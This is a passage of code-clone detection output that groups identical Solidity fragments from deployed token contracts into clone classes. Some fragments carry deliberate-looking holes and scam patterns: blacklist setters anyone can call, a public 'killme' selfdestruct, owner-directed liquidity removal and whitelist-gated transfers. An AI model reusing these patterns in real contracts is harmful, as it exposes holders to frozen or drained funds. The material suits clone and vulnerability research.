<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="233" endline="235" pcid="4198">
    function approve(address _spender, uint _value) public returns (bool) {
        return super.approve(_spender, _value);
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="225" endline="227" pcid="4196">
    function transfer(address _to, uint _value) public returns (bool) {
        return super.transfer(_to, _value);
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="242" endline="244" pcid="2498">
    function approve(address _spender, uint _value) public returns (bool) {
        return super.approve(_spender, _value);
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="234" endline="236" pcid="2496">
    function transfer(address _to, uint _value) public returns (bool) {
        return super.transfer(_to, _value);
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="239" endline="241" pcid="2328">
    function transfer(address _to, uint _value) public returns (bool) {
        return super.transfer(_to, _value);
    }
</source>
</class>

<class classid="144" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="238" endline="240" pcid="1335">
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="229" endline="231" pcid="4197">
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="238" endline="240" pcid="2497">
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="243" endline="245" pcid="2329">
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }
</source>
</class>

<class classid="145" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="246" endline="248" pcid="1337">
    function launchTrading() public onlyOwner {
        tradingEnabled = true;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="174" endline="176" pcid="6452">
    function resumePrivateSale() public onlyOwner {
        isPrivateSaleRunning = true;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="210" endline="212" pcid="6459">
    function resumePublicSale() public onlyOwner {
        isPublicSaleRunning = true;
    }
</source>
</class>

<class classid="146" nclones="4" nlines="9" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="250" endline="267" pcid="1338">
    function addLiquidityETH() public payable hasRole(POOL_MANAGER) {
        transfer(address(this), totalSupply);
        if (allowance[address(this)][address(router)] < totalSupply) {
            allowance[address(this)][address(router)] = totalSupply;
        }

        (uint amountToken, uint amountETH, ) = router.addLiquidityETH.value(address(this).balance)(
            address(this),
            totalSupply,
            0,
            0,
            address(this),
            block.timestamp
        );

        pair = IUniswapV2Factory(router.factory()).getPair(address(this), router.WETH());
        poolInfo.push(PoolInfo(uint128(amountToken), uint128(amountETH)));
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="246" endline="263" pcid="2499">
    function addLiquidityETH() public payable hasRole(POOL_MANAGER) {
        transfer(address(this), totalSupply);
        if (allowance[address(this)][address(router)] < totalSupply) {
            allowance[address(this)][address(router)] = totalSupply;
        }

        (uint amountToken, uint amountETH, ) = router.addLiquidityETH.value(address(this).balance)(
            address(this),
            totalSupply,
            0,
            0,
            address(this),
            block.timestamp
        );

        pair = IUniswapV2Factory(router.factory()).getPair(address(this), router.WETH());
        poolInfo.push(PoolInfo(uint128(amountToken), uint128(amountETH)));
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="251" endline="268" pcid="2331">
    function addLiquidityETH() public payable hasRole(POOL_MANAGER) {
        transfer(address(this), totalSupply);
        if (allowance[address(this)][address(router)] < totalSupply) {
            allowance[address(this)][address(router)] = totalSupply;
        }

        (uint amountToken, uint amountETH, ) = router.addLiquidityETH.value(address(this).balance)(
            address(this),
            totalSupply,
            0,
            0,
            address(this),
            block.timestamp
        );

        pair = IUniswapV2Factory(router.factory()).getPair(address(this), router.WETH());
        poolInfo.push(PoolInfo(uint128(amountToken), uint128(amountETH)));
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="237" endline="254" pcid="4199">
    function addLiquidityETH() public payable hasRole(POOL_MANAGER) {
        transfer(address(this), totalSupply);
        if (allowance[address(this)][address(router)] < totalSupply) {
            allowance[address(this)][address(router)] = totalSupply;
        }

        (uint amountToken, uint amountETH, ) = router.addLiquidityETH.value(address(this).balance)(
            address(this),
            totalSupply,
            0,
            0,
            address(this),
            block.timestamp
        );

        pair = IUniswapV2Factory(router.factory()).getPair(address(this), router.WETH());
        poolInfo.push(PoolInfo(uint128(amountToken), uint128(amountETH)));
    }
</source>
</class>

<class classid="147" nclones="4" nlines="9" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="269" endline="285" pcid="1339">
    function removeLiquidityETH() public hasRole(POOL_MANAGER) {
        uint256 liquidity = IERC20(pair).balanceOf(address(this));
        TransferHelper.safeApprove(pair, address(router), liquidity);
        poolInfo.length --;
        if (liquidity > 0) {
            (uint amountToken, uint amountETH) = router.removeLiquidityETH(
                address(this),
                liquidity,
                0,
                0,
                owner,
                block.timestamp
            );
            if (amountToken > 0 && amountETH > 0)
                poolInfo.push(PoolInfo(uint128(amountToken), uint128(amountETH)));
        }
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="270" endline="286" pcid="2332">
    function removeLiquidityETH() public hasRole(POOL_MANAGER) {
        uint256 liquidity = IERC20(pair).balanceOf(address(this));
        TransferHelper.safeApprove(pair, address(router), liquidity);
        poolInfo.length --;
        if (liquidity > 0) {
            (uint amountToken, uint amountETH) = router.removeLiquidityETH(
                address(this),
                liquidity,
                0,
                0,
                owner,
                block.timestamp
            );
            if (amountToken > 0 && amountETH > 0)
                poolInfo.push(PoolInfo(uint128(amountToken), uint128(amountETH)));
        }
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="256" endline="272" pcid="4200">
    function removeLiquidityETH() public hasRole(POOL_MANAGER) {
        uint256 liquidity = IERC20(pair).balanceOf(address(this));
        TransferHelper.safeApprove(pair, address(router), liquidity);
        poolInfo.length --;
        if (liquidity > 0) {
            (uint amountToken, uint amountETH) = router.removeLiquidityETH(
                address(this),
                liquidity,
                0,
                0,
                owner,
                block.timestamp
            );
            if (amountToken > 0 && amountETH > 0)
                poolInfo.push(PoolInfo(uint128(amountToken), uint128(amountETH)));
        }
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="265" endline="281" pcid="2500">
    function removeLiquidityETH() public hasRole(POOL_MANAGER) {
        uint256 liquidity = IERC20(pair).balanceOf(address(this));
        TransferHelper.safeApprove(pair, address(router), liquidity);
        poolInfo.length --;
        if (liquidity > 0) {
            (uint amountToken, uint amountETH) = router.removeLiquidityETH(
                address(this),
                liquidity,
                0,
                0,
                owner,
                block.timestamp
            );
            if (amountToken > 0 && amountETH > 0)
                poolInfo.push(PoolInfo(uint128(amountToken), uint128(amountETH)));
        }
    }
</source>
</class>

<class classid="148" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="287" endline="289" pcid="1340">
    function updatePoolInfo(uint _poolId, uint128 reverseToken, uint128 reverseWETH) public hasRole(POOL_MANAGER) {
        poolInfo[_poolId] = PoolInfo(reverseToken, reverseWETH);
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="274" endline="276" pcid="4201">
    function updatePoolInfo(uint _poolId, uint128 reverseToken, uint128 reverseWETH) public hasRole(POOL_MANAGER) {
        poolInfo[_poolId] = PoolInfo(reverseToken, reverseWETH);
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="283" endline="285" pcid="2501">
    function updatePoolInfo(uint _poolId, uint128 reverseToken, uint128 reverseWETH) public hasRole(POOL_MANAGER) {
        poolInfo[_poolId] = PoolInfo(reverseToken, reverseWETH);
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="288" endline="290" pcid="2333">
    function updatePoolInfo(uint _poolId, uint128 reverseToken, uint128 reverseWETH) public hasRole(POOL_MANAGER) {
        poolInfo[_poolId] = PoolInfo(reverseToken, reverseWETH);
    }
</source>
</class>

<class classid="149" nclones="4" nlines="5" similarity="75">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="291" endline="296" pcid="1341">
    function lockLpToken() public payable onlyOwner {
        uint256 liquidity = IERC20(pair).balanceOf(address(this));
        TransferHelper.safeApprove(pair, address(locker), liquidity);

        locker.lockLPToken.value(msg.value)(pair, liquidity, block.timestamp + 30000000, address(0), true, msg.sender);
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="278" endline="283" pcid="4202">
    function lockLpToken() public payable onlyOwner {
        uint256 liquidity = IERC20(pair).balanceOf(address(this));
        TransferHelper.safeApprove(pair, address(locker), liquidity);

        locker.lockLPToken.value(msg.value)(pair, liquidity, block.timestamp + 1300000, address(0), true, msg.sender);
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="292" endline="297" pcid="2334">
    function lockLpToken() public payable onlyOwner {
        uint256 liquidity = IERC20(pair).balanceOf(address(this));
        TransferHelper.safeApprove(pair, address(locker), liquidity);

        locker.lockLPToken.value(msg.value)(pair, liquidity, block.timestamp + 1300000, address(0), true, msg.sender);
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="287" endline="292" pcid="2502">
    function lockLpToken() public payable onlyOwner {
        uint256 liquidity = IERC20(pair).balanceOf(address(this));
        TransferHelper.safeApprove(pair, address(locker), liquidity);

        locker.lockLPToken.value(msg.value)(pair, liquidity, block.timestamp + 1300000, address(0), true, msg.sender);
    }
</source>
</class>

<class classid="150" nclones="8" nlines="4" similarity="100">
<source file="systems/source-code/0x2e07ae2b85fbdd60251df13d6d39a64125cbabe9.sol" startline="65" endline="68" pcid="1361">
    function aTbL(address _address) public {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
<source file="systems/source-code/0x30211be10119c323649fdeeba28dd40a9f24ff97.sol" startline="67" endline="70" pcid="1473">
    function aTbL(address _address) public {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
<source file="systems/source-code/0x30211be10119c323649fdeeba28dd40a9f24ff97.sol" startline="62" endline="65" pcid="1472">
    function aTwL(address _address) public {
        whitelist[_address] = true;
        emit AddToWhitelist(_address);
    }
</source>
<source file="systems/source-code/0x848fff4055be44647b20d1a0826e3762e91362be.sol" startline="65" endline="68" pcid="4959">
    function aTbL(address _address) public {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
<source file="systems/source-code/0xa3a9799e42e46aeb47cc263fe9334f9170127fb1.sol" startline="65" endline="68" pcid="5952">
    function aTbL(address _address) public {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
<source file="systems/source-code/0xece7c555d922e9915e36e3e1fdfd8c15e838c3f0.sol" startline="77" endline="80" pcid="8662">
    function aTbL(address _address) public {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
<source file="systems/source-code/0xece7c555d922e9915e36e3e1fdfd8c15e838c3f0.sol" startline="72" endline="75" pcid="8661">
    function aTwL(address _address) public {
        whitelist[_address] = true;
        emit AddToWhitelist(_address);
    }
</source>
<source file="systems/source-code/0xedb32c55d9f85d5fa88098574ed97edbcf9afbbf.sol" startline="65" endline="68" pcid="8683">
    function aTbL(address _address) public {
        blacklist[_address] = true;
        emit AddToBlacklist(_address);
    }
</source>
</class>

<class classid="151" nclones="6" nlines="3" similarity="100">
<source file="systems/source-code/0x2e07ae2b85fbdd60251df13d6d39a64125cbabe9.sol" startline="70" endline="72" pcid="1362">
    function removeFromBlacklist(address _address) public {
        blacklist[_address] = false;
    }
</source>
<source file="systems/source-code/0x30211be10119c323649fdeeba28dd40a9f24ff97.sol" startline="72" endline="74" pcid="1474">
    function removeFromBlacklist(address _address) public {
        blacklist[_address] = false;
    }
</source>
<source file="systems/source-code/0xedb32c55d9f85d5fa88098574ed97edbcf9afbbf.sol" startline="70" endline="72" pcid="8684">
    function removeFromBlacklist(address _address) public {
        blacklist[_address] = false;
    }
</source>
<source file="systems/source-code/0xece7c555d922e9915e36e3e1fdfd8c15e838c3f0.sol" startline="82" endline="84" pcid="8663">
    function removeFromBlacklist(address _address) public {
        blacklist[_address] = false;
    }
</source>
<source file="systems/source-code/0xa3a9799e42e46aeb47cc263fe9334f9170127fb1.sol" startline="70" endline="72" pcid="5953">
    function removeFromBlacklist(address _address) public {
        blacklist[_address] = false;
    }
</source>
<source file="systems/source-code/0x848fff4055be44647b20d1a0826e3762e91362be.sol" startline="70" endline="72" pcid="4960">
    function removeFromBlacklist(address _address) public {
        blacklist[_address] = false;
    }
</source>
</class>

<class classid="152" nclones="2" nlines="7" similarity="100">
<source file="systems/source-code/0x30211be10119c323649fdeeba28dd40a9f24ff97.sol" startline="35" endline="42" pcid="1468">
    function _transfer(address _from, address _to, uint256 _value) internal onlyWhitelisted(_from) notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
<source file="systems/source-code/0xece7c555d922e9915e36e3e1fdfd8c15e838c3f0.sol" startline="45" endline="52" pcid="8657">
    function _transfer(address _from, address _to, uint256 _value) internal onlyWhitelisted(_from) notBlacklisted(_from) notBlacklisted(_to) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "ERC20: insufficient balance");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
</source>
</class>

<class classid="153" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x30211be10119c323649fdeeba28dd40a9f24ff97.sol" startline="44" endline="47" pcid="1469">
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x8bc69EEB26c131274971c972576C54a5765de2de.sol" startline="33" endline="36" pcid="5161">
    function transfer(address _recipient, uint256 _amount) public returns (bool success) {
        _transfer(msg.sender, _recipient, _amount);
        return true;
    }
</source>
</class>

<class classid="154" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x305d0dbc22f496fda4bd8ff96bb4b4839f1e6fc5.sol" startline="101" endline="103" pcid="1479">
    function killme() public {
        selfdestruct(payable(msg.sender));
    }
</source>
<source file="systems/source-code/0x305d0dbc22f496fda4bd8ff96bb4b4839f1e6fc5.sol" startline="113" endline="115" pcid="1481">
    function killme() public {
        selfdestruct(payable(msg.sender));
    }
</source>
</class>

<class classid="155" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x31F625ac650FDa3767aC926B1CD8Dbde569045f4.sol" startline="17" endline="19" pcid="1573">
    function() external payable {
        multiplicate();
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="262" endline="264" pcid="8634">
    function () external payable {
        revert();
    }
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="213" endline="215" pcid="7141">
     function () public payable {
         revert();
     }
</source>
</class>

<class classid="156" nclones="2" nlines="7" similarity="100">
<source file="systems/source-code/0x34d169651d4350d9ee6cb277c67e0e821fafd6ba.sol" startline="22" endline="28" pcid="1649">
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x6072F0969b9222854391AeA1Ec490B00384Bf669.sol" startline="18" endline="25" pcid="3657">
    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  // deduct from sender's balance
        balanceOf[to] += value;          // add to recipient's balance
        emit Transfer(msg.sender, to, value);
        return true;
    }
</source>
</class>

<class classid="157" nclones="2" nlines="9" similarity="100">
<source file="systems/source-code/0x34d169651d4350d9ee6cb277c67e0e821fafd6ba.sol" startline="36" endline="44" pcid="1651">
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x6072F0969b9222854391AeA1Ec490B00384Bf669.sol" startline="40" endline="52" pcid="3659">
    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
</source>
</class>

<class classid="158" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="40" endline="43" pcid="1690">
    function add(Role storage role, address account) internal {
        require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="521" endline="524" pcid="8122">
    function add(Role storage role, address account) internal {
        require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;
    }
</source>
</class>

<class classid="159" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="48" endline="51" pcid="1691">
    function remove(Role storage role, address account) internal {
        require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="529" endline="532" pcid="8123">
    function remove(Role storage role, address account) internal {
        require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;
    }
</source>
</class>

<class classid="160" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="57" endline="60" pcid="1692">
    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="538" endline="541" pcid="8124">
    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];
    }
</source>
</class>

<class classid="161" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="146" endline="148" pcid="1694">
    function __Context_init() internal initializer {
        __Context_init_unchained();
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2046" endline="2048" pcid="1752">
  function upgradeToV2() public onlyOwner {
    _upgradeToV2();
  }
</source>
</class>

<class classid="162" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="160" endline="163" pcid="1697">
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="22" endline="25" pcid="6435">
    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
</source>
</class>

<class classid="163" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="231" endline="234" pcid="1701">
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="29" endline="32" pcid="9000">
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="29" endline="32" pcid="8956">
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="56" endline="59" pcid="6439">
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
</source>
</class>

<class classid="164" nclones="4" nlines="5" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="240" endline="244" pcid="1702">
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="61" endline="65" pcid="6440">
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="34" endline="38" pcid="8957">
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="34" endline="38" pcid="9001">
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
</source>
</class>

<class classid="165" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="925" endline="927" pcid="1712">
  function isAdministrator(address _administrator) public override view returns (bool) {
    return _administrators.has(_administrator);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1400" endline="1402" pcid="1744">
  function isSeizer(address _seizer) public override view returns (bool) {
    return _seizers.has(_seizer);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="960" endline="962" pcid="1719">
  function isRealmAdministrator(address _administrator) public override view returns (bool) {
    return _realmAdministrators.has(_administrator);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2051" endline="2053" pcid="1753">
  function isSupplier(address _supplier) public override view returns (bool) {
    return _suppliers.has(_supplier);
  }
</source>
</class>

<class classid="166" nclones="8" nlines="4" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="929" endline="932" pcid="1713">
  function addAdministrator(address _administrator) public override onlyOwner {
    _administrators.add(_administrator);
    emit AdministratorAdded(_administrator);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="969" endline="972" pcid="1721">
  function removeRealmAdministrator(address _administrator) public override onlyAdministrator {
    _realmAdministrators.remove(_administrator);
    emit RealmAdministratorRemoved(_administrator);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2055" endline="2058" pcid="1754">
  function addSupplier(address _supplier) public override onlyAdministrator {
    _suppliers.add(_supplier);
    emit SupplierAdded(_supplier);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1409" endline="1412" pcid="1746">
  function removeSeizer(address _seizer) public override onlyAdministrator {
    _seizers.remove(_seizer);
    emit SeizerRemoved(_seizer);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="934" endline="937" pcid="1714">
  function removeAdministrator(address _administrator) public override onlyOwner {
    _administrators.remove(_administrator);
    emit AdministratorRemoved(_administrator);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2060" endline="2063" pcid="1755">
  function removeSupplier(address _supplier) public override onlyAdministrator {
    _suppliers.remove(_supplier);
    emit SupplierRemoved(_supplier);
  }  
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1404" endline="1407" pcid="1745">
  function addSeizer(address _seizer) public override onlyAdministrator {
    _seizers.add(_seizer);
    emit SeizerAdded(_seizer);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="964" endline="967" pcid="1720">
  function addRealmAdministrator(address _administrator) public override onlyAdministrator {
    _realmAdministrators.add(_administrator);
    emit RealmAdministratorAdded(_administrator);
  }
</source>
</class>

<class classid="167" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1025" endline="1027" pcid="1727">
  function name() public override view hasProcessor returns (string memory) {
    return _processor.name();
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1032" endline="1034" pcid="1728">
  function symbol() public override view hasProcessor returns (string memory) {
    return _processor.symbol();
  }
</source>
</class>

<class classid="168" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1039" endline="1041" pcid="1729">
  function decimals() public override view hasProcessor returns (uint8) {
    return _processor.decimals();
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1046" endline="1048" pcid="1730">
  function totalSupply() public override view hasProcessor returns (uint256) {
    return _processor.totalSupply();
  }
</source>
</class>

<class classid="169" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1174" endline="1182" pcid="1737">
  function increaseApproval(
    address _spender,
    uint _addedValue
  )
    public
    hasProcessor
  {
    _increaseApproval(_msgSender(), _spender, _addedValue);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1194" endline="1202" pcid="1738">
  function decreaseApproval(
    address _spender,
    uint _subtractedValue
  )
    public
    hasProcessor
  {
    _decreaseApproval(_msgSender(), _spender, _subtractedValue);
  }
</source>
</class>

<class classid="170" nclones="2" nlines="5" similarity="100">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1246" endline="1250" pcid="1741">
  function _increaseApproval(address _owner, address _spender, uint _addedValue) internal {
    _processor.increaseApproval(_owner, _spender, _addedValue);
    uint256 allowed = _processor.allowance(_owner, _spender);
    emit Approval(_owner, _spender, allowed);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1259" endline="1263" pcid="1742">
  function _decreaseApproval(address _owner, address _spender, uint _subtractedValue) internal {
    _processor.decreaseApproval(_owner, _spender, _subtractedValue);
    uint256 allowed = _processor.allowance(_owner, _spender);
    emit Approval(_owner, _spender, allowed);
  }
</source>
</class>

<class classid="171" nclones="3" nlines="5" similarity="75">
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1417" endline="1423" pcid="1747">
  function seize(address _account, uint256 _value)
    public override onlySeizer hasProcessor
  {
    _processor.seize(_msgSender(), _account, _value);
    emit Seize(_account, _value);
    emit Transfer(_account, _msgSender(), _value); 
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2065" endline="2071" pcid="1756">
  function mint(address _to, uint256 _amount)
    public override onlySupplier hasProcessor
  {
    _processor.mint(_msgSender(), _to, _amount);
    emit Mint(_to, _amount);
    emit Transfer(address(0), _to, _amount);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2073" endline="2079" pcid="1757">
  function burn(address _from, uint256 _amount)
    public override onlySupplier hasProcessor 
  {
    _processor.burn(_msgSender(), _from, _amount);
    emit Burn(_from, _amount);
    emit Transfer(_from, address(0), _amount);
  }
</source>
</class>

<class classid="172" nclones="3" nlines="7" similarity="100">
